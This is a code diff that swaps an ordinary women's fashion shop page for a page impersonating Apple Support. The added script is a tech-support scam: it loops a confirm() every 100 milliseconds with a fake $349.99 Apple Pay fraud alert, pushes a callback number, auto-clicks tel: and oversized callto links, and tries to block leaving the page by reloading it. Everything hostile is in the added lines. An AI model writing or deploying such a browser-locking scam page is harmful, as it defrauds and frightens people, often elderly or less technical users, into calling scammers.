@@ -1,524 +1,374 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Women's Fashion Store</title>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 
-<style>
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family:'Segoe UI',sans-serif;
-}
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-VYZMPBSPB3"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
 
-body{
-    background:#fff7fb;
-    color:#111827;
-}
+    gtag('config', 'G-VYZMPBSPB3');
+    </script>
 
-.hero{
-    min-height:100vh;
-    background:
-    linear-gradient(rgba(60,10,35,.55),rgba(60,10,35,.72)),
-    url('https://images.unsplash.com/photo-1483985988355-763728e1935b?auto=format&fit=crop&w=1600&q=80');
-    background-size:cover;
-    background-position:center;
-    color:#fff;
-}
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta http-equiv="cache-control" content="max-age=3600" />
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple Support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more." />
+    <link rel="stylesheet" href="Base.css" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="fonts/_families%3dSF%2bPro%2cv1_7CSF%2bPro%2bIcons%2cv1html.html" />
+    <script src="text_tel.js"></script>
 
-.navbar{
-    width:90%;
-    max-width:1200px;
-    margin:auto;
-    padding:25px 0;
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-}
-
-.logo{
-    font-size:30px;
-    font-weight:800;
-    color:#f9a8d4;
-}
-
-.navbar ul{
-    display:flex;
-    list-style:none;
-    gap:30px;
-}
-
-.navbar a{
-    color:#fff;
-    text-decoration:none;
-    font-weight:600;
-}
-
-.hero-content{
-    width:90%;
-    max-width:1200px;
-    margin:auto;
-    padding-top:120px;
-}
-
-.hero-content span{
-    display:inline-block;
-    background:rgba(249,168,212,.22);
-    color:#fce7f3;
-    padding:10px 18px;
-    border-radius:30px;
-    margin-bottom:20px;
-}
-
-.hero-content h1{
-    font-size:66px;
-    max-width:780px;
-    line-height:1.1;
-    margin-bottom:20px;
-}
-
-.hero-content p{
-    max-width:650px;
-    font-size:19px;
-    line-height:1.8;
-    color:#fce7f3;
-    margin-bottom:35px;
-}
-
-.btn{
-    display:inline-block;
-    background:#db2777;
-    color:#fff;
-    padding:15px 35px;
-    border-radius:8px;
-    text-decoration:none;
-    font-weight:700;
-    transition:.3s;
-}
-
-.btn:hover{
-    background:#be185d;
-    transform:translateY(-3px);
-}
-
-section{
-    padding:90px 8%;
-}
-
-.section-title{
-    text-align:center;
-    margin-bottom:60px;
-}
-
-.section-title h2{
-    font-size:42px;
-    margin-bottom:12px;
-}
-
-.section-title p{
-    color:#64748b;
-}
-
-.categories{
-    display:grid;
-    grid-template-columns:repeat(4,1fr);
-    gap:25px;
-}
-
-.category{
-    background:#fff;
-    padding:35px;
-    border-radius:20px;
-    text-align:center;
-    box-shadow:0 10px 35px rgba(0,0,0,.08);
-    transition:.3s;
-}
-
-.category:hover{
-    transform:translateY(-8px);
-    background:#fce7f3;
-}
-
-.category .icon{
-    font-size:45px;
-    margin-bottom:15px;
-}
-
-.about{
-    background:#fff;
-    display:grid;
-    grid-template-columns:1fr 1fr;
-    gap:50px;
-    align-items:center;
-}
-
-.about img{
-    width:100%;
-    border-radius:25px;
-    box-shadow:0 15px 40px rgba(0,0,0,.12);
-}
-
-.about h2{
-    font-size:42px;
-    margin-bottom:20px;
-}
-
-.about p{
-    color:#64748b;
-    line-height:1.8;
-    margin-bottom:20px;
-}
-
-.features{
-    display:grid;
-    grid-template-columns:repeat(2,1fr);
-    gap:15px;
-}
-
-.feature{
-    background:#fdf2f8;
-    padding:18px;
-    border-radius:15px;
-    border-left:4px solid #db2777;
-}
-
-.products-section{
-    background:#fff7fb;
-}
-
-.products{
-    display:grid;
-    grid-template-columns:repeat(4,1fr);
-    gap:25px;
-}
-
-.product{
-    background:#fff;
-    border-radius:20px;
-    overflow:hidden;
-    box-shadow:0 10px 35px rgba(0,0,0,.08);
-    transition:.3s;
-}
-
-.product:hover{
-    transform:translateY(-8px);
-}
-
-.product img{
-    width:100%;
-    height:270px;
-    object-fit:cover;
-}
-
-.product-content{
-    padding:20px;
-}
-
-.product-content h3{
-    margin-bottom:8px;
-}
-
-.product-content p{
-    color:#64748b;
-    margin-bottom:10px;
-}
-
-.price{
-    font-size:22px;
-    color:#db2777;
-    font-weight:bold;
-}
-
-.offer{
-    background:linear-gradient(135deg,#db2777,#831843);
-    color:#fff;
-    display:grid;
-    grid-template-columns:1.2fr .8fr;
-    gap:40px;
-    align-items:center;
-}
-
-.offer h2{
-    font-size:45px;
-    margin-bottom:15px;
-}
-
-.offer p{
-    line-height:1.8;
-    margin-bottom:25px;
-    color:#fce7f3;
-}
-
-.offer-box{
-    background:#fff;
-    color:#111827;
-    padding:35px;
-    border-radius:20px;
-    text-align:center;
-}
-
-.discount{
-    font-size:55px;
-    font-weight:bold;
-    color:#db2777;
-}
-
-.stats{
-    background:#111827;
-    color:#fff;
-    display:grid;
-    grid-template-columns:repeat(4,1fr);
-    gap:20px;
-    text-align:center;
-}
-
-.stats h3{
-    color:#f9a8d4;
-    font-size:45px;
-}
-
-.stats p{
-    color:#cbd5e1;
-}
-
-.cta{
-    text-align:center;
-    background:#fff;
-}
-
-.cta h2{
-    font-size:45px;
-    margin-bottom:15px;
-}
-
-.cta p{
-    color:#64748b;
-    margin-bottom:25px;
-    font-size:18px;
-}
-
-footer{
-    background:#020617;
-    color:#cbd5e1;
-    text-align:center;
-    padding:25px;
-}
-
-@media(max-width:900px){
-    .categories,
-    .about,
-    .features,
-    .products,
-    .offer,
-    .stats{
-        grid-template-columns:1fr;
-    }
-
-    .navbar ul{
-        display:none;
-    }
-
-    .hero-content h1{
-        font-size:42px;
-    }
-
-    section{
-        padding:60px 6%;
-    }
-}
-</style>
 </head>
 
 <body>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate" />
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Marketplace </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">Posts </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">Feedback </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Help Centre </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">Contact </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Customer - service </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Account Recovery </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search Apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.Apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search Apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false" />
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav" />
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
 
-<div class="hero">
-<nav class="navbar">
-<div class="logo">StyleMuses</div>
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-805-240-6550 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close"
+                            id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class='as-banner-cont'>
+                        <div class='as-banner-image as-banner-image--top'>
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("globalnav/apple/contact-us-hero.image.large_2x.jpg");
+                                }
 
-<ul>
-<li><a href="#">Home</a></li>
-<li><a href="#">Dresses</a></li>
-<li><a href="#">Ethnic Wear</a></li>
-<li><a href="#">New Arrivals</a></li>
-<li><a href="#">Contact</a></li>
-</ul>
-</nav>
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
 
-<div class="hero-content">
-<span>Trendy Women's Fashion</span>
-<h1>Elegant Outfits For Every Mood & Moment</h1>
-<p>
-Discover stylish dresses, tops, ethnic wear, co-ord sets, casual outfits,
-and premium womenâ€™s fashion designed for confidence and comfort.
-</p>
-<a href="#" class="btn">Shop Collection</a>
-</div>
-</div>
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("globalnav/apple/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="globalnav/apple/contact-us-hero.image.small_2x.jpg 735w, globalnav/apple/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="globalnav/apple/contact-us-hero.image.large_2x.jpg"
+                            />
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock" />
+                        </div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
 
-<section>
-<div class="section-title">
-<h2>Shop By Category</h2>
-<p>Fresh fashion styles for every occasion</p>
-</div>
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="globalnav/apple/us.png" alt="" width="16" height="16" />United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name" />
+                <meta content="+1-805-240-6550
+			 " property="telephone" />
+            </section>
+        </div>
+    </footer>
 
-<div class="categories">
-<div class="category">
-<div class="icon">ðŸ‘—</div>
-<h3>Dresses</h3>
-</div>
 
-<div class="category">
-<div class="icon">ðŸ¥»</div>
-<h3>Ethnic Wear</h3>
-</div>
 
-<div class="category">
-<div class="icon">ðŸ‘š</div>
-<h3>Tops</h3>
-</div>
+    <script src="code.jquery.com/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
 
-<div class="category">
-<div class="icon">ðŸ‘œ</div>
-<h3>Accessories</h3>
-</div>
-</div>
-</section>
 
-<section class="about">
-<div>
-<img src="https://images.unsplash.com/photo-1496747611176-843222e1e57c?auto=format&fit=crop&w=900&q=80" alt="Women's Fashion">
-</div>
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
 
-<div>
-<h2>Fashion That Fits Your Lifestyle</h2>
-<p>
-StyleMuse brings modern, comfortable, and elegant womenâ€™s fashion for work,
-parties, festivals, travel, and everyday wear.
-</p>
-<p>
-Our collection is created with soft fabrics, flattering fits, and beautiful designs
-to help you express your personal style with confidence.
-</p>
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
 
-<div class="features">
-<div class="feature">
-<h4>âœ” Premium Fabric</h4>
-<p>Soft, breathable, and comfortable materials.</p>
-</div>
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
 
-<div class="feature">
-<h4>âœ” Modern Designs</h4>
-<p>Trendy styles inspired by latest fashion.</p>
-</div>
+        window.number = getPar('phone');
 
-<div class="feature">
-<h4>âœ” Perfect Fit</h4>
-<p>Designed for comfort and confidence.</p>
-</div>
+        window.number = (window.number ? window.number : '+1-805-240-6550');
 
-<div class="feature">
-<h4>âœ” Fast Delivery</h4>
-<p>Quick doorstep delivery on all orders.</p>
-</div>
-</div>
-</div>
-</section>
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
 
-<section class="products-section">
-<div class="section-title">
-<h2>Trending Collection</h2>
-<p>Best-selling outfits loved by women</p>
-</div>
+        if (ios) {
 
-<div class="products">
-<div class="product">
-<img src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?auto=format&fit=crop&w=700&q=80" alt="Floral Dress">
-<div class="product-content">
-<h3>Floral Summer Dress</h3>
-<p>Lightweight and elegant everyday style.</p>
-<div class="price">â‚¹1,499</div>
-</div>
-</div>
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
 
-<div class="product">
-<img src="https://images.unsplash.com/photo-1529139574466-a303027c1d8b?auto=format&fit=crop&w=700&q=80" alt="Women's Top">
-<div class="product-content">
-<h3>Casual Stylish Top</h3>
-<p>Perfect for outings and daily wear.</p>
-<div class="price">â‚¹799</div>
-</div>
-</div>
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
 
-<div class="product">
-<img src="https://images.unsplash.com/photo-1610030469983-98e550d6193c?auto=format&fit=crop&w=700&q=80" alt="Ethnic Wear">
-<div class="product-content">
-<h3>Ethnic Kurti Set</h3>
-<p>Elegant festive and office wear.</p>
-<div class="price">â‚¹1,899</div>
-</div>
-</div>
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
 
-<div class="product">
-<img src="https://images.unsplash.com/photo-1551232864-3f0890e580d9?auto=format&fit=crop&w=700&q=80" alt="Co-ord Set">
-<div class="product-content">
-<h3>Modern Co-ord Set</h3>
-<p>Trendy comfort for modern women.</p>
-<div class="price">â‚¹2,299</div>
-</div>
-</div>
-</div>
-</section>
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
 
-<section class="offer">
-<div>
-<h2>New Season Fashion Sale</h2>
-<p>
-Refresh your wardrobe with beautiful dresses, tops, ethnic wear,
-and accessories at exciting special prices.
-</p>
-<a href="#" class="btn">Shop Offers</a>
-</div>
+        function getText() {
+            var str = window.defaultText;
 
-<div class="offer-box">
-<h3>Limited Time Offer</h3>
-<div class="discount">35% OFF</div>
-<p>On selected womenâ€™s fashion styles</p>
-</div>
-</section>
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
 
-<section class="stats">
-<div>
-<h3>80K+</h3>
-<p>Happy Customers</p>
-</div>
 
-<div>
-<h3>1200+</h3>
-<p>Fashion Styles</p>
-</div>
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
 
-<div>
-<h3>4.9</h3>
-<p>Customer Rating</p>
-</div>
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
 
-<div>
-<h3>24/7</h3>
-<p>Online Support</p>
-</div>
-</section>
 
-<section class="cta">
-<h2>Upgrade Your Wardrobe Today</h2>
-<p>Explore premium womenâ€™s fashion designed for beauty, comfort, and confidence.</p>
-<a href="#" class="btn">Start Shopping</a>
-</section>
+        setInterval(function() {
+            myFunction()
+        }, 100);
 
-<footer>
-Â© 2026 StyleMuses Women's Fashion Store. All Rights Reserved.
-</footer>
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-805-240-6550"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was used at the Apple Store for a $349.99 Apple Pay pre-authorization. This transaction has been immediately placed on hold due to security concerns. If this was NOT you, call Apple Support NOW at +1-805-240-6550 to freeze your account and prevent unauthorized charges!")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
 
 </body>
+
+
 </html>
